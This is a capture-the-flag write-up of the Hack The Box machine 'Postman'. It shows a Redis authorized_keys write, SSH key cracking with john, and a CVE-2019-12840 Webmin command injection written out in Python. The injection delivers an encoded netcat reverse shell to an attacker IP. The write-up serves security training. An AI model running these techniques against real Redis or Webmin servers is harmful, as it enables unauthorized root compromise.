---
maquina: "Postman"
dificultad: "Easy"
os: "Linux"
plataforma: "htb"
release: "02 Nov 2019"
retire: "14 Mar 2020"
creadores: "TheCyberGeek"
htb_url: "https://hackthebox.com/machines/postman"
app_url: "https://app.hackthebox.com/machines/215"
url: "https://0xdf.gitlab.io/2020/03/14/htb-postman.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

![Postman](https://0xdfimages.gitlab.io/img/postman-cover.png)

Postman was a good mix of easy challenges providing a chance to play with Redis and exploit Webmin. I’ll gain initial access by using Redis to write an SSH public key into an authorized_keys file. Then I’ll pivot to Matt by cracking his encrypted SSH key and using the password. That same password provides access to the Webmin instance, which is running as root, and can be exploited to get a shell. In Beyond Root, I’ll look at a Metasploit Redis exploit and why it failed on this box.

## Recon

### nmap

`nmap` shows four ports, HTTP (TCP 80, 10000), SSH (TCP 22) and Redis (TCP 6379):

```console
root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-04 06:47 EST
Nmap scan report for 10.10.10.160
Host is up (0.033s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
10000/tcp open  snet-sensor-mgmt

Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
root@kali# nmap -p 22,80,6379,10000 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.160
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-04 06:48 EST
Nmap scan report for 10.10.10.160
Host is up (0.029s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.33 seconds
```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache versions](https://packages.ubuntu.com/search?keywords=apache2), this looks like Ubuntu 18.04, Bionic Beaver.

### Website - TCP 80

#### Site

The site looks to be under construction:

![1572961630346](https://0xdfimages.gitlab.io/img/1572961630346.png)

None of the links go anywhere, and I didn’t see anything interesting the source.

#### Directory Brute Force

`gobuster` returned some directories:

```console
root@kali# gobuster -u http://10.10.10.160 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php -o scans/gobuster-root-80-php

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.160/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Extensions   : php
[+] Timeout      : 10s
=====================================================
2019/11/04 06:53:02 Starting gobuster
=====================================================
/images (Status: 301)
/upload (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
=====================================================
2019/11/04 07:01:16 Finished
=====================================================
```

These had directory listing on, but I didn’t find anything interesting in them

### Webmin - TCP 10000

#### HTTP

On TCP 10000, there’s a Webmin instance. Visiting on HTTP returns an error:

![1572961776318](https://0xdfimages.gitlab.io/img/1572961776318.png)

Not only does this give a pointer to HTTPS, but it also gives a hostname as well. I’ll add postman to my hosts file. I did some basic poking around with the port 80 site using this hostname, but didn’t find anything different.

#### HTTPS

With HTTPS, I get a login form for Webmin:

![1572961884159](https://0xdfimages.gitlab.io/img/1572961884159.png)

Webmin often runs as root to allow for it to do all the administrative things it does, so I’ll keep an eye out for credentials.

### Redis - TCP 6379

I can interact with Redis just using `nc`. I can run `keys` to list the current keys:

```console
root@kali# nc 10.10.10.160 6379
keys *
*0
```

It’s a bit cleaner to use `redis-cli`, which I can install on Kali with `apt-get install redis-tools`. Same command:

```console
root@kali# redis-cli -h 10.10.10.160
10.10.10.160:6379> keys *
(empty list or set)
```

This redis instance has nothing in it. I can add something:

```console
10.10.10.160:6379> incr 0xdf
(integer) 1
10.10.10.160:6379> keys *
1) "0xdf"
10.10.10.160:6379> get 0xdf
"1"
```

One known method to get RCE via redis using [Master-Slave Replication](https://medium.com/@knownsec404team/rce-exploits-of-redis-based-on-master-slave-replication-ef7a664ce1d0). I couldn’t get that to work here (I’ll look at why in Beyond Root). Also, this exploit would often set the redis instance into a state where I couldn’t write, which led to a lot of resets when the box was released.

## Shell as redis

### Strategy

Since I can write to redis, I basically have almost arbitrary write on the file system as the user redis is running as by writing the database to a file with the `save` command. The reason it’s “almost arbitrary” is because I can’t cleanly write a file, but rather, I can write my content with junk on either side. But there are many file-based attacks on Linux that are robust to the extra junk. For example, writing an SSH key. `sshd` will ignore the junk lines, and process lines that have a public key in the `authorized_keys` file.

### Write SSH Key

I can check the current directory for redis:

```console
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis"
```

I can make that guess that this is likely the user that runs the redis server’s home directory. I can confirm that by changing the current directory to `./.ssh`:

```console
10.10.10.160:6379> config set dir ./.ssh
OK
10.10.10.160:6379> config get dir
1) "dir"
2) "/var/lib/redis/.ssh"
```

The fact that that command works indicates that directory exists, and which suggests this is a home directory for this user.

I’ll generate a key with `ssh-keygen`, and then add it to a file with some extra newlines before and after the key:

```console
root@kali# (echo -e "\n\n"; cat ~/id_rsa_generated.pub; echo -e "\n\n") > spaced_key.txt
```

Redis is going to write a binary database file into `authorized_keys`, where `sshd` is then going to open that file as an ASCII text file and read it line by line, looking for a public key that matches the private key being sent to it. The newlines will help make sure that the public key is on its own line in the file.

I can use the `-x` options in `redis-cli` which will “read the last argument from STDIN” to `cat` this file into `redis-cli` and set it’s value into the database:

```console
root@kali# cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set 0xdf
OK
```

Next I’ll tell redis that the dbname is `authorized_keys`, and then `save`:

```console
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
```

### SSH

Now I can get a shell with SSH:

```console
root@kali# ssh -i ~/id_rsa_generated redis@10.10.10.160
The authenticity of host '10.10.10.160 (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ id
uid=107(redis) gid=114(redis) groups=114(redis)
```

With that shell, I can look at the `authorized_keys` file and see there’s junk, but there’s also a line that is the public key:

```console
redis@Postman:~/.ssh$ cat authorized_keys
REDIS0008       redis-ver4.0.9
redis-bits@ctime¡used-mem

                         aof-preamble0xdfB9

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0mJaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali
```

## Priv: redis –> Matt

### Enumeration

In looking around the file system, I see one user with a home directory, and it contains `user.txt`:

```console
redis@Postman:/home/Matt$ ls -l
total 4
-rw-rw---- 1 Matt Matt 33 Aug 26 03:07 user.txt
```

As redis, I can’t read it.

Matt also has a `.ssh` directory, but I can’t get into it. However, looking around the file system, there’s an interesting file in `/opt` that I can access:

```console
redis@Postman:/opt$ ls -l
total 4
-rwxr-xr-x 1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak
```

It is a private key, and it’s encrypted:

```console
redis@Postman:/opt$ file id_rsa.bak
id_rsa.bak: PEM RSA private key

redis@Postman:/opt$ cat id_rsa.bak
-----BEGIN PRIVATE KEY-----[REDACTED]-----END PRIVATE KEY-----
```

### Crack Key

I’ll use the `ssh2john.py` script to convert the key into a format that `john` can break:

```console
root@kali# /opt/john/run/ssh2john.py id_rsa_postman_matt_enc > id_rsa_postman_matt.john
```

I’ll run it in `john`, and it cracks:

```console
root@kali# /opt/john/run/john id_rsa_postman_matt.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 3 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa_postman_matt_enc)
1g 0:00:00:08 DONE (2019-11-06 05:57) 0.1122g/s 1609Kp/s 1609Kc/s 1609KC/s     1990..*7¡Vamos!
Session completed
```

The password is “computer2008”.

### SSH Fail

Obviously the next thing I tried is to SSH as Matt, but it fails:

```console
root@kali# ssh -i ~/id_rsa_postman_matt_enc matt@10.10.10.160
Enter passphrase for key '/root/id_rsa_postman_matt_enc':
Connection closed by 10.10.10.160 port 22
```

This isn’t that my password is wrong. If I put in the wrong pass, it just prints the passphrase prompt again:

```console
root@kali# ssh -i ~/id_rsa_postman_matt_enc Matt@10.10.10.160
Enter passphrase for key '/root/id_rsa_postman_matt_enc':
Enter passphrase for key '/root/id_rsa_postman_matt_enc':
```

That decryption of the key is being done locally on my box, so `ssh` knows without having to talk to Postman that I entered the wrong password.

If I run `ssh` with `-vvv` for super verbose, I don’t get much more information:

```console
root@kali# ssh -i ~/id_rsa_postman_matt_enc Matt@10.10.10.160 -vvv
OpenSSH_8.0p1 Debian-6, OpenSSL 1.1.1d  10 Sep 2019
...[snip]...
debug3: authmethod_is_enabled publickey
debug1: Next authentication method: publickey
debug1: Trying private key: /root/id_rsa_postman_matt_enc
Enter passphrase for key '/root/id_rsa_postman_matt_enc':
debug3: sign_and_send_pubkey: RSA SHA256:pmHRNsyWPhOd5dum4QPtS3ifdtk3KawkS09ZqCBmFHM
debug3: sign_and_send_pubkey: signing using rsa-sha2-512
debug3: send packet: type 50
debug2: we sent a publickey packet, wait for reply
Connection closed by 10.10.10.160 port 22
```

Once I decrypt and send the key, the server just closes the connection.

I tried connecting as Matt using “computer2008” as a password, but get a similar result:

```console
root@kali# ssh Matt@10.10.10.160
Matt@10.10.10.160's password:
Permission denied, please try again.
```

As redis, I am able to look at the `/etc/ssh/sshd_config` file, which includes these lines:

```plaintext
#deny users
DenyUsers Matt
```

That explains what’s happening here.

### su

It turns out that Matt reuses his SSH key password as his system password, as I find out when I eventually try to use `su`, it works:

```console
redis@Postman:/$ su Matt
Password:
Matt@Postman:/$ id
uid=1000(Matt) gid=1000(Matt) groups=1000(Matt)
```

Now I can grab `user.txt`:

```console
Matt@Postman:~$ cat user.txt
517ad0ec************************
```

## Priv: Matt –> root

### Webmin Login

Armed with Matt’s password, I decided to check webmin, because it’s very common that webmin uses the system’s authentication. It works:

![1573039090905](https://0xdfimages.gitlab.io/img/1573039090905.png)

Matt does not have access to do much:

![1573039123431](https://0xdfimages.gitlab.io/img/1573039123431.png)

### Webmin Exploits

There was a bunch of news in August 2019 about a [backdoor inserted into the source code for webmin](https://medium.com/@80vul/the-stories-behind-cve-2012-5159-198eaad2449d) that allowed remote code execution. The vulnerability is in the password change script, `password_change.cgi`. Unfortunately, password changing is not enabled in this instance of webmin, as I can see if I try to POST to `/password_change.cgi` (which I found in the [Metasploit exploit](https://www.exploit-db.com/exploits/47230)):

```http
HTTP/1.0 500 Perl execution failed
Server: MiniServ/1.910
Date: Wed, 6 Nov 2019 11:53:02 GMT
Content-type: text/html; Charset=iso-8859-1
Connection: close

<h1>Error - Perl execution failed</h1>
<p>Password changing is not enabled! at /usr/share/webmin/password_change.cgi line 12.
</p>
```

But this started me looking at other webmin vulnerabilities. CVE-2019-12840 is described on [Packet Storm](https://packetstormsecurity.com/files/cve/CVE-2019-12840) as:

> An arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.

It turns out that’s the one thing Matt can do!

### Exploit POC

I didn’t find anyone who had scripted this out, and I don’t like using Metasploit because it’s harder to see under the hood of what’s going on, so I’m going to play with this on my own.

It looks like the Metasploit modules POSTs the payload as:

```plaintext
"u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages"
```

url-decoded that’s:

```plaintext
u=acl/apt&u= | #{payload}&ok_top=Update Selected Packages
```

I’ll open up a python terminal and play around a bit. First I needed to login, so I import `requests` (as well as the packages to disable the annoying `InsecureRequestWarning`), start a session, and issue a POST that matches what I see in Burp when I log in:

```console
>>> import requests
>>> import requests.packages.urllib3
>>> requests.packages.urllib3.disable_warnings()
>>> s = requests.session()
>>> s.post('https://10.10.10.160:10000/session_login.cgi', data={'page':'', 'user':'Matt', 'pass':'computer2008'}, verify=False, proxies={"https":"http://127.0.0.1:8080"})
<Response [200]>
```

The next part took some playing around with. There were a few POSTs made in the code, but it’s the last one that contained the payload, so I figured I’d try that next and see if I could get it to work. That is the post that looks like this:

```ruby
res = send_request_cgi(
  {
    'method' => 'POST',
    'cookie' => "sid=#{cookie}",
    'ctype'  => 'application/x-www-form-urlencoded',
    'uri' => normalize_uri(target_uri.path, 'package-updates', 'update.cgi'),
    'headers' =>
      {
        'Referer' => "#{peer}/package-updates/?xnavigation=1"
      },
    'data' => "u=acl%2Fapt&u=%20%7C%20#{payload}&ok_top=Update+Selected+Packages"
  })
```

The cookie will be handled by the session in `requests`. So I started as simply as possible:

```console
>>> resp = s.post('https://10.10.10.160:10000/package-updates/update.cgi', data={'u':'acl/apt', 'u':' | bash -c id', 'ok_top':'Update Selected Packages'}, verify=False, proxies={"https":"http://127.0.0.1:8080"})
```

I’m using `verify=False` so I can hit untrusted TLS, and `proxies` to send the request through Burp so I can troubleshoot.

When I print the output, I see an interesting warning at the bottom:

```console
>>> print(resp.text)
<!DOCTYPE html>
...[snip]...
<b>Warning!</b> Webmin has detected that the program <tt>https://10.10.10.160:10000/package-updates/update.cgi</tt> was linked to from an unknown URL, which appears to be outside the Webmin server. This may be an attempt
 to trick your server into executing a dangerous command.<p>
Make sure your browser is configured to send referrer information so that it can be verified by Webmin.<p>
Alternately, you can configure Webmin to allow links from unknown referrers by :<ul><li>Login as <tt>root</tt>, and edit the <tt>/etc/webmin/config</tt> file.<li>Find the line <tt>referers_none=1</tt> and change it to <tt
>referers_none=0</tt>.<li>Save the file.</ul><p>WARNING - this has the side effect of opening your system up to reflected XSS attacks and so is not recommended!!<p>
<p>
```

So I need a referer header. I’ll try that:

```console
>>> resp = s.post('https://10.10.10.160:10000/package-updates/update.cgi', data={'u':'acl/apt', 'u':' | bash -c id', 'ok_top':'Update Selected Packages'}, verify=False, proxies={"https":"http://127.0.0.1:8080"}, headers={'Referer':'https://10.10.10.160:10000/'})
```

This time, the response seems to indicate no error from the server, but also, no result of `id`. I bounced over to Burp to take a look:

```http
POST /package-updates/update.cgi HTTP/1.1
Host: 10.10.10.160:10000
User-Agent: python-requests/2.21.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Referer: https://10.10.10.160:10000/
Cookie: redirect=1; sid=557645a850e92b4939b9290c33fba75a; testing=1
Content-Length: 49
Content-Type: application/x-www-form-urlencoded

u=+%7C+bash+-c+id&ok_top=Update+Selected+Packages
```

The request is supposed to have two different `u` parameters, but only the second one is being sent! This is `requests` trying to help fix an error for me. I found a [post on Stack Overflow](https://stackoverflow.com/questions/23384230/how-to-post-multiple-value-with-same-key-in-python-requests) which showed how to fix this using key-value tuples:

```console
>>> resp = s.post('https://10.10.10.160:10000/package-updates/update.cgi', data=[('u', 'acl/apt'), ('u', ' | bash -c id'), ('ok_top', 'Update Selected Packages')], verify=False, proxies={"https":"http://127.0.0.1:8080"}, headers={'Referer':'https://10.10.10.160:10000/'})
```

And when I look at the response, I see the execution result (in the middle, in `<pre>` tags):

```console
>>> print(resp.text)
...[snip]...
<div class="panel-body">
Building complete list of packages ..<p>
Now updating <tt>acl  | bash -c id</tt> ..<br>
<ul>
<b>Installing package(s) with command <tt>apt-get -y  install acl  | bash -c id</tt> ..</b><p>
<pre>uid&#61;0(root) gid&#61;0(root) groups&#61;0(root)
</pre>
<b>.. install complete.</b><p>
</ul><br>
No packages were installed. Check the messages above for the cause of the error.<p>
```

I can stop here and just get a shell, but I for the sake of polishing, I’ll import `re` to get the results out of the large mass of HTML:

```console
>>> import re
>>> re.findall('<pre>.*</pre>', resp.text, re.DOTALL)
['<pre>uid&#61;0(root) gid&#61;0(root) groups&#61;0(root)\n</pre>']
>>> re.findall('<pre>(.*)</pre>', resp.text, re.DOTALL)
['uid&#61;0(root) gid&#61;0(root) groups&#61;0(root)\n']
>>> print(re.findall('<pre>(.*)</pre>', resp.text, re.DOTALL)[0])
uid&#61;0(root) gid&#61;0(root) groups&#61;0(root)
```

I’ll use `html` to unescape the encoding:

```console
>>> import html
>>> print(html.unescape(re.findall('<pre>(.*)</pre>', resp.text, re.DOTALL)[0]))
uid=0(root) gid=0(root) groups=0(root)
```

### Shell

Now I’ll issue a command to get a shell. I had to play around for a bit to get something that would, work, but I found that base64 encoding the reverse shell commands and then echoing that string into `base64 -d` and then `bash` worked:

```console
>>> resp = s.post('https://10.10.10.160:10000/package-updates/update.cgi', data=[('u', 'acl/apt'), ('u', '| bash -c "echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTAuMTQuNiA0NDMgPi90bXAvZgo=|base64 -d|bash -i"'), ('ok_top', 'Update Selected Packages')], verify=False, proxies={"https":"http://127.0.0.1:8080"}, headers={'Referer':'https://10.10.10.160:10000/'})
```

Then at my listener:

```console
root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.160.
Ncat: Connection from 10.10.10.160:33626.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

And grab `root.txt`:

```console
# cat /root/root.txt
a257741c************************
```

## Beyond Root - Failed Slave Exploit

On first seeing Redis listening, I came across this exploit to get RCE in Metasploit:

```console
msf5 exploit(linux/redis/redis_unauth_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:4444
[*] 10.10.10.160:6379     - Compile redis module extension file
[+] 10.10.10.160:6379     - Payload generated successfully!
[*] 10.10.10.160:6379     - Listening on 10.10.14.6:6379
[*] 10.10.10.160:6379     - Rogue server close...
[*] 10.10.10.160:6379     - Sending command to trigger payload.
[!] 10.10.10.160:6379     - This exploit may require manual cleanup of './pgrarj.so' on the target
[*] Exploit completed, but no session was created.
```

It doesn’t work. I ran the exploit with Wireshark recording, and saw this stream:

![image-20200314075929918](https://0xdfimages.gitlab.io/img/image-20200314075929918.png)

The exploit is trying to set the server to be a slave of my host, then configuring a database filename of a `.so` file. Then it tries to load that `.so` file, but the error `-ERR unknown command 'MODULE'` comes back.

This version of Redis is not vulnerable to this attack. Someone created an [issue on the Metasploit GitHub](https://github.com/rapid7/metasploit-framework/issues/12563) about it. But the issue is not a version thing. The issue is that the `MODULE` command doesn’t exist. Why? The answer is in the Redis config:

```console
redis@Postman:/etc/redis$ grep MODULE redis.conf
################################## MODULES #####################################
rename-command MODULE ""
```
